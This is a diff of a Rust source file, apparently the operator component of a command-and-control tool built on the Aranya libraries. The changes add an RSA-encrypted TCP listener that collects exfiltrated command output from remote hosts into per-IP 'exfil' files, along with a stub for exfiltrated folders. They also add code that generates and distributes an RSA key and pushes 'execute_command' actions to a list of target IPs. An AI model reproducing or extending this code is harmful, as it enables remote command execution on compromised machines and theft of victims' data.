@@ -6,8 +6,8 @@ mod c2syncer;
 use std::{
     io::{Write, Read},
     net::{IpAddr, Ipv4Addr, SocketAddr, TcpListener},
-    path::Path,
-    fs,
+    path::{Path, PathBuf},
+    fs::{self, OpenOptions},
     str::FromStr,
     sync::Arc,
     time::Duration
@@ -15,14 +15,16 @@ use std::{
 
 use aranya_crypto::{CmdId, DeviceId, EncryptionKey, EncryptionPublicKey, IdentityKey, IdentityVerifyingKey, Rng, afc::{UniChannel, UniOpenKey, UniSealKey, UniSecrets}, default::{DefaultCipherSuite, DefaultEngine}, id::Id, policy::LabelId};
 use aranya_fast_channels::{AranyaState, Directed, shm::{Flag, Mode, ReadState, WriteState}};
+use aranya_policy_ifgen::Actionable;
 use aranya_policy_vm::{Text, text};
 use aranya_runtime::{Sink, VmEffect, vm_action};
 use clap::Parser;
+use rsa::{Oaep, RsaPrivateKey, sha2::Sha256, traits::PublicKeyParts};
 use tokio::sync::Mutex;
 
-use crate::{c2syncer::{C2Syncer, c2push, c2sync, new_quic_client}, common::{C2Client, PrivateKeyBundle}};
+use crate::{c2syncer::{C2Syncer, c2push, c2sync, new_quic_client}, common::{C2Client, FastChannelMessage, PrivateKeyBundle}, policy::update_rsa_key};
 
-struct OperatorSink {}
+struct OperatorSink;
 
 #[derive(Parser)]
 struct CommandArguments {
@@ -35,6 +37,9 @@ struct CommandArguments {
 
     #[arg(long)]
     start_afc: bool,
+
+    #[arg(long)]
+    new_rsa: bool,
 
     #[arg(long)]
     config_dir: String,
@@ -64,71 +69,57 @@ impl Sink<VmEffect> for OperatorSink {
     }
 }
 
-async fn afc_listener(
-    mut engine: DefaultEngine<Rng, DefaultCipherSuite>,
-    peer_ident: DeviceId,
-    peer_enc: EncryptionPublicKey::<DefaultCipherSuite>,
-    keys: PrivateKeyBundle
+const MAX_MESSAGE_SIZE: usize = 1024 * 1024 * 1024;
+
+fn parse_fast_channel_message(
+    msg: &FastChannelMessage,
+    addr: IpAddr,
+    dir: &Path
 ) {
-    let channel = UniChannel {
-        parent_cmd_id: CmdId::default(),
-        our_sk: &keys.enc_key,
-        their_pk: &keys.enc_key.public().unwrap(),
-        seal_id: Id::default(),
-        open_id: keys.ident_key.id().unwrap(),
-        label_id: LabelId::default()
-    };
+    match msg {
+        FastChannelMessage::CommandExecuted { data } => {
+            let dir = dir.join("exfil").join("command");
+            fs::create_dir_all(&dir);
+            let mut file = OpenOptions::new()
+                .append(true)
+                .create(true)
+                .open(dir.join(addr.to_string()))
+                .expect("Couldn't open cmd file");
 
-    let writestate: WriteState<DefaultCipherSuite, Rng> = match WriteState::open(
-        aranya_fast_channels::shm::Path::from_bytes(b"/afc1\0").unwrap(),
-        Flag::Create, Mode::ReadWrite, 42, Rng
-    ) {
-        Ok(v) => v,
-        Err(_) => {
-            // Already exists
-            WriteState::open(
-                aranya_fast_channels::shm::Path::from_bytes(b"/afc1\0").unwrap(),
-                Flag::OpenOnly, Mode::ReadWrite, 42, Rng
-            ).unwrap()
+            file.write_all(&data);
+        },
+        FastChannelMessage::FoldersExfiltrated { folders } => {
+
         }
-    };
+    }
+}
 
-    let secrets = UniSecrets::new(&mut engine, &channel).unwrap();
-
-    let openchannel = writestate.add(Directed::OpenOnly {
-        open: UniOpenKey::from_peer_encap(&channel, secrets.peer).unwrap().into_raw_key()
-    }, channel.label_id, keys.ident_key.id().unwrap()).unwrap();
-
-    let readstate = aranya_fast_channels::Client::<ReadState<DefaultCipherSuite>>::new(
-        ReadState::open(
-            aranya_fast_channels::shm::Path::from_bytes(b"/afc1\x00").unwrap(),
-            Flag::OpenOnly, Mode::ReadWrite, 42
-        ).unwrap()
-    );
-
+async fn afc_listener(
+    dir: PathBuf,
+    key: RsaPrivateKey
+) {
     let listener = TcpListener::bind("127.0.0.1:4446").unwrap();
+    println!("Listening now");
 
+    let mut buffer = vec![0; MAX_MESSAGE_SIZE];
     for stream in listener.incoming() {
-        let mut buffer = [0; 1024];
+        let mut stream = stream.unwrap();
+        let addr = stream.peer_addr().unwrap().ip();
 
-        match stream.unwrap().read(&mut buffer) {
-            Ok(n) => {
-                println!("{n}");
-                println!("Data: {:?}", &buffer[..n]);
+        let Ok(n) = stream.read(&mut buffer) else {
+            continue;
+        };
 
-                // TODO: lol buffer is too big wth
-                let mut dest = vec!(0u8; n - aranya_fast_channels::Client::<ReadState<DefaultCipherSuite>>::OVERHEAD);
-                let mut ctx = readstate.setup_open_ctx(openchannel).unwrap();
-                readstate.open(&mut ctx, &mut dest, &buffer[..n]).unwrap();
+        let Ok(v) = key.decrypt(
+            Oaep::new::<Sha256>(),
+            &buffer[..n]
+        ) else {
+            continue;
+        };
 
-                print!("{:?}\n", dest);
-            }
-            Err(_) => {}
+        if let Ok(data) = postcard::from_bytes::<FastChannelMessage>(&v) {
+            parse_fast_channel_message(&data, addr, &dir);
         }
-
-        // if let Ok(Some(req)) = stream.unwrap().receive().await {
-        //     println!("{:?}", req);
-        // }
     }
 }
 
@@ -152,10 +143,8 @@ async fn main() {
     let dir = Path::new(&args.config_dir);
 
     let _ = fs::create_dir(&dir);
-    // TODO: {} required here or no ?
-    let mut sink = OperatorSink {};
+    let mut sink = OperatorSink;
     let mut aranya = C2Client::new(dir);
-    // let keys = aranya.create_new_keys(dir);
     
     let keys = match args.new_graph {
         true => {
@@ -182,114 +171,6 @@ async fn main() {
         fs::write("src/graph.txt", graph.as_array());
     }
 
-        // TODO: AFC test
-        // let identity = IdentityKey::<DefaultCipherSuite>::new(&mut engine);
-        // let encryption = EncryptionKey::<DefaultCipherSuite>::new(&mut engine);
-
-        let peer_ident = IdentityKey::<DefaultCipherSuite>::new(&mut aranya.engine);
-        let peer_enc = EncryptionKey::<DefaultCipherSuite>::new(&mut aranya.engine);
-
-        let ch1 = UniChannel {
-            parent_cmd_id: CmdId::default(),
-            our_sk: &keys.enc_key,
-            their_pk: &peer_enc.public().unwrap(), // TODO: 
-            seal_id: keys.ident_key.id().unwrap(),
-            open_id: peer_ident.id().unwrap(), // TODO: Remote
-            label_id: LabelId::default()
-        };
-
-        let ch2 = UniChannel {
-            parent_cmd_id: CmdId::default(),
-            our_sk: &peer_enc,
-            their_pk: &keys.enc_key.public().unwrap(), // TODO: 
-            seal_id: keys.ident_key.id().unwrap(),
-            open_id: peer_ident.id().unwrap(), // TODO: Remote
-            label_id: LabelId::default()
-        };
-
-
-        // use aranya_fast_channels::{
-        //     AfcState, AranyaState, Channel, Client, Directed, Error, LocalChannelId,
-        //     crypto::Aes256Gcm,
-        //     shm::{Flag, Mode, ReadState, WriteState},
-        // };
-
-        // // let afcdir = dir.join("");
-
-        // // // TODO: Fix OpenOnly here
-        // // let nulpath = format!("{}\0", dir.join("afc").to_str().unwrap());
-        // // println!("{nulpath}");
-        // let write_state1: WriteState<DefaultCipherSuite, Rng> = match WriteState::open(
-        //     aranya_fast_channels::shm::Path::from_bytes(b"/afc\0").unwrap(),
-        //     Flag::Create, Mode::ReadWrite, 42, Rng
-        // ) {
-        //     Ok(v) => v,
-        //     Err(_) => {
-        //         // Already exists
-        //         WriteState::open(
-        //             aranya_fast_channels::shm::Path::from_bytes(b"/afc\0").unwrap(),
-        //             Flag::OpenOnly, Mode::ReadWrite, 42, Rng
-        //         ).unwrap()
-        //     }
-        // };
-
-        // let read_state1 = aranya_fast_channels::Client::<ReadState<DefaultCipherSuite>>::new(
-        //     ReadState::open(
-        //         aranya_fast_channels::shm::Path::from_bytes(b"/afc\0").unwrap(),
-        //         Flag::OpenOnly, Mode::ReadWrite, 42
-        //     ).unwrap()
-        // );
-
-        // let secrets1 = UniSecrets::new(&mut aranya.engine, &ch1).unwrap();
-
-        // let channel1 = write_state1.add(Directed::SealOnly {
-        //     seal: UniSealKey::from_author_secret(&ch1, secrets1.author).unwrap().into_raw_key()
-        // }, ch1.label_id, keys.ident_key.id().unwrap()).unwrap();
-
-        // let ciphertext = {
-        //     let mut dest = vec!(0u8; "Hello".len() + Client::<ReadState<DefaultCipherSuite>>::OVERHEAD);
-        //     let mut ctx = read_state1.setup_seal_ctx(channel1).unwrap();
-        //     read_state1.seal(&mut ctx, &mut dest, "Hello".as_bytes()).unwrap();
-        //     dest
-        // };
-
-        // print!("{:?}\n", ciphertext);
-
-
-        // let write_state2: WriteState<DefaultCipherSuite, Rng> = match WriteState::open(
-        //     aranya_fast_channels::shm::Path::from_bytes(b"/afc1\0").unwrap(),
-        //     Flag::Create, Mode::ReadWrite, 42, Rng
-        // ) {
-        //     Ok(v) => v,
-        //     Err(_) => {
-        //         // Already exists
-        //         WriteState::open(
-        //             aranya_fast_channels::shm::Path::from_bytes(b"/afc1\0").unwrap(),
-        //             Flag::OpenOnly, Mode::ReadWrite, 42, Rng
-        //         ).unwrap()
-        //     }
-        // };
-    
-        // let channel2 = write_state2.add(Directed::OpenOnly {
-        //     open: UniOpenKey::from_peer_encap(&ch2, secrets1.peer).unwrap().into_raw_key()
-        // }, ch1.label_id, keys.ident_key.id().unwrap()).unwrap();
-
-        // let read_state2 = aranya_fast_channels::Client::<ReadState<DefaultCipherSuite>>::new(
-        //     ReadState::open(
-        //         aranya_fast_channels::shm::Path::from_bytes(b"/afc1\x00").unwrap(),
-        //         Flag::OpenOnly, Mode::ReadWrite, 42
-        //     ).unwrap()
-        // );
-
-        // {
-        //     let mut dest = vec!(0u8; ciphertext.len() - Client::<ReadState<DefaultCipherSuite>>::OVERHEAD);
-        //     let mut ctx = read_state2.setup_open_ctx(channel2).unwrap();
-        //     read_state2.open(&mut ctx, &mut dest, &ciphertext).unwrap();
-
-        //     print!("{:?}\n", dest);
-        // }
-        // TODO: End AFC test
-
     if let Some(command) = args.command {
         let txt = Text::from_str(&command).unwrap();
         clientstate.action(
@@ -297,41 +178,59 @@ async fn main() {
             &mut sink,
             vm_action!(execute_command(txt))
         );
+    }
 
-        let quic = {
-            let mut syncbind = bind.clone();
-            syncbind.set_port(4446);
-            Arc::new(new_quic_client(syncbind))
-        };
+    if args.new_rsa {
+        let mut rng = Rng;
+        let key = RsaPrivateKey::new(&mut rng, 2048)
+            .expect("Failed to generate RSA private key");
+        aranya.save_rsa_key(&key);
 
-        let syncer = Arc::new(Mutex::new(C2Syncer::new(clientstate, sink)));
+        let pubkey = key.to_public_key();
 
-        for ipstr in args.args {
-            let socket: SocketAddr = ipstr.parse().expect("Invalid IP format");
-            c2push(socket, Arc::clone(&quic), Arc::clone(&syncer), aranya.get_graph()).await;
-            println!("SYNCED");
-        }
-        
-        // TODO: This sleep is very important becasue without it, the
-        //   program will end and the data won't be transferred to
-        //   some of the peers, if any at all.
-        tokio::time::sleep(Duration::from_millis(1000)).await;
+        println!("{:?}", pubkey);
+
+        update_rsa_key(pubkey.n().to_bytes_be(), pubkey.e().to_bytes_be()).with_action(|action| {
+            clientstate.action(
+                aranya.get_graph(),
+                &mut sink,
+                action
+            )
+        });
     }
 
     if args.start_afc {
-        // TODO: Random keys
-        let peer_ident = IdentityKey::<DefaultCipherSuite>::new(
-            &mut aranya.engine
-        ).id().unwrap();
-
-        let peer_enc = EncryptionKey::<DefaultCipherSuite>::new(
-            &mut aranya.engine
-        ).public().unwrap();
-
-        tokio::spawn(afc_listener(aranya.engine.clone(), peer_ident, peer_enc, keys));
-        tokio::time::sleep(Duration::from_millis(1000)).await;
-        aranya.setup_fast_channel();
+        tokio::spawn(afc_listener(dir.to_path_buf(), aranya.load_rsa_key()));
     }
+
+    let quic = {
+        let mut syncbind = bind.clone();
+        syncbind.set_port(4446);
+        Arc::new(new_quic_client(syncbind))
+    };
+
+    let syncer = Arc::new(Mutex::new(C2Syncer::new(clientstate, sink)));
+
+    for ipstr in args.args {
+        let socket: SocketAddr = ipstr.parse()
+            .expect("Invalid IP format");
+
+        c2push(
+            socket,
+            Arc::clone(&quic),
+            Arc::clone(&syncer),
+            aranya.get_graph()
+        ).await;
+    }
+
+
+    // TODO: This sleep is very important becasue without it, the
+    //   program will end and the data won't be transferred to
+    //   some of the peers, if any at all.
+    // tokio::time::sleep(Duration::from_millis(1000)).await;
+
+    // TODO: For now, sleep forever, for the server loop
+    tokio::time::sleep(Duration::from_millis(100000000)).await;
 
     // let graph = aranya.create_graph(&dir, &mut cs, &mut sink, &keys);
 
